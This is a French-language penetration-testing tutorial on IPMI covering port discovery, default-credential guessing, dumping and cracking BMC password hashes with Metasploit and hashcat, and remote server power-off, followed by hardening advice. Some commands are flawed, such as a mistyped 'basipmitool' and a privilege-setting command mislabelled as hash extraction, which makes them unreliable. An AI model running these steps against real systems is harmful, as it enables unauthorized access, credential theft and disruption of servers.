# IPMI

### **IPMI - Guide Complet**

***

⚠️ **Avertissement :** Ce contenu est strictement destiné à un usage éducatif et éthique dans le domaine de la cybersécurité. Toute utilisation illégale ou malveillante est interdite et engage la seule responsabilité de l’utilisateur.

***

### **Introduction**

Le protocole **IPMI (Intelligent Platform Management Interface)** permet la gestion des serveurs à distance, notamment via des fonctions comme l’accès à la console, le redémarrage ou la surveillance matérielle. Cependant, ce protocole est souvent mal configuré, laissant des points d’entrée exploitables pour des attaques. Ce guide explore les techniques d'énumération, d'interaction, et d'exploitation d'IPMI dans un cadre légal et éthique.

***

### **🚀 Étape 1 : Préparer l'Environnement**

**1.1 Identifier le Port IPMI**

IPMI utilise généralement le port **623 (UDP)** pour la communication. Pour identifier les services IPMI actifs, utilisez **Nmap** :

```bash
nmap -p 623 -sU -sV <target>
```

**Exemple de sortie :**

```arduino
623/udp open  ipmi-rmcp  IPMI 2.0
```

**Explications :**

* `623` : Port par défaut d'IPMI.
* `ipmi-rmcp` : Remote Management Control Protocol, utilisé par IPMI.

***

**1.2 Pré-requis**

* Un système Linux avec des outils comme **ipmitool**, **Impacket**, ou **Metasploit**.
* Les permissions root pour exécuter certaines commandes réseau.

***

### **🛠️ Étape 2 : Énumération IPMI**

**2.1 Utiliser ipmitool pour Lister les Informations**

**ipmitool** est l’outil standard pour interagir avec IPMI.

1.  **Installer ipmitool** : Sur une distribution Debian/Ubuntu :

    ```bash
    sudo apt install ipmitool
    ```
2.  **Découvrir le Serveur BMC (Baseboard Management Controller)** : Utilisez `ipmitool` pour interroger la cible :

    ```bash
    ipmitool -I lanplus -H <target> -U <username> -P <password> chassis status
    ```

    **Exemple** :

    ```bash
    basipmitool -I lanplus -H 192.168.1.10 -U admin -P admin chassis status
    ```

    **Résultat attendu** :

    ```yaml
    System Power : on
    Power Overload : false
    Main Power Fault : false
    ```

***

**2.2 Énumération avec Nmap**

Utilisez les scripts NSE de Nmap pour obtenir des informations sur IPMI :

```bash
nmap -sU -p 623 --script ipmi-* <target>
```

**Exemple** :

```bash
nmap -sU -p 623 --script ipmi-version <target>
```

***

**2.3 Tester des Comptes par Défaut**

Les identifiants par défaut sont souvent laissés activés sur IPMI. Essayez :

* **Nom d’utilisateur** : `admin`
* **Mot de passe** : `admin`, `password`, ou vide.

***

### **🔍 Étape 3 : Exploitation de Failles IPMI**

**3.1 Extraction des Hash avec ipmitool**

IPMI 2.0 permet parfois d’extraire les hash des utilisateurs. Si vous avez accès à un compte valide :

```bash
ipmitool -I lanplus -H <target> -U <username> -P <password> user list
```

**Exemple de sortie** :

```arduino
ID  Name         Access  Authentication  Privilege
1   admin        true    MD5             ADMINISTRATOR
```

Ensuite, pour extraire les hash :

```bash
ipmitool -I lanplus -H <target> -U <username> -P <password> user priv <ID> ADMINISTRATOR
```

**3.2 Craquer les Hash**

Utilisez **hashcat** pour casser les hash IPMI :

```bash
hashcat -m 7300 hash.txt wordlist.txt
```

**Explications :**

* `-m 7300` : Spécifie le mode IPMI pour hashcat.

***

**3.3 Exploitation avec Metasploit**

**Metasploit** dispose de modules pour IPMI.

1.  **Scanner IPMI** :

    ```bash
    msfconsole
    use auxiliary/scanner/ipmi/ipmi_version
    set RHOSTS <target>
    run
    ```
2.  **Exploitation Directe** : Si le module détecte une vulnérabilité, utilisez :

    ```bash
    use auxiliary/scanner/ipmi/ipmi_dumphashes
    set RHOSTS <target>
    run
    ```

***

**3.4 Contrôle à Distance**

Avec des identifiants valides, vous pouvez contrôler le système :

1.  Allumer/Éteindre le serveur :

    ```bash
    ipmitool -I lanplus -H <target> -U <username> -P <password> power on
    ipmitool -I lanplus -H <target> -U <username> -P <password> power off
    ```
2.  Redémarrer le serveur :

    ```bash
    ipmitool -I lanplus -H <target> -U <username> -P <password> power cycle
    ```

***

### **🔒 Étape 4 : Contre-Mesures et Sécurisation**

**4.1 Restreindre l’Accès IPMI**

* Configurez un pare-feu pour limiter l’accès au port **623** uniquement aux IP autorisées.

**4.2 Désactiver les Comptes Par Défaut**

* Supprimez ou désactivez les comptes par défaut comme `admin`.

**4.3 Activer la Sécurisation Chiffrée**

* Utilisez **LAN+** pour sécuriser les connexions et désactivez les connexions non chiffrées.

**4.4 Auditer les Logs**

*   Surveillez les connexions IPMI pour détecter des activités suspectes :

    ```bash
    ipmitool sel list
    ```

***

### **Résumé des Commandes Clés**

| Commande / outil                                | Description                                |
| ----------------------------------------------- | ------------------------------------------ |
| `ipmitool -I lanplus ... chassis status`        | Obtenir le statut du serveur via IPMI.     |
| `nmap -sU -p 623 --script ipmi-*`               | Énumérer les services IPMI avec Nmap.      |
| `ipmitool -I lanplus ... user list`             | Lister les utilisateurs IPMI.              |
| `hashcat -m 7300 hash.txt wordlist.txt`         | Craquer les hash IPMI extraits.            |
| `msfconsole ... use auxiliary/scanner/ipmi/...` | Scanner ou exploiter IPMI avec Metasploit. |

***

#### **Conclusion**

Le protocole IPMI, bien qu’utile pour la gestion des serveurs, peut présenter des failles critiques s’il est mal configuré. Ce guide fournit une méthodologie complète pour énumérer, interagir et exploiter IPMI dans un cadre légal et éthique. Suivez également les contre-mesures pour sécuriser vos systèmes et éviter les abus.

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
